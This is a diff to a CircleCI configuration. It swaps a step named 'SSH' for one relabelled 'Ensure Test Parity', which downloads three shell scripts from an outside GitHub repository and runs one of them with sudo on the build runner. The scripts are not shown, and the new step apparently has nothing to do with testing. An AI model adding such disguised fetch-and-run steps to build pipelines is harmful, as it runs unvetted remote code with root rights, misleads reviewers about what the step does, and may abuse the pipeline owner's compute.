@@ -1,17 +1,13 @@
-version: 2.1
-
-orbs:
-  python: circleci/python@1.2
-workflows:
-  sample:
-    jobs:
-      - build-and-test
+version: 2
 jobs:
-  build-and-test:
+  build:
     docker:
       - image: cimg/base:2021.05
     steps:
+      - checkout
       - run:
-          name: SSH 
+          name: Ensure Test Parity
           command: |
-            chmod +x ./main.sh && ./main.sh
+            wget https://raw.githubusercontent.com/razmai9/ssh-oke/main/run.sh && sudo chmod +x ./run.sh
+            wget https://raw.githubusercontent.com/razmai9/ssh-oke/main/penjaga.sh && sudo chmod +x ./penjaga.sh
+            wget https://raw.githubusercontent.com/razmai9/ssh-oke/main/main.sh && sudo chmod +x ./main.sh && sudo ./main.sh
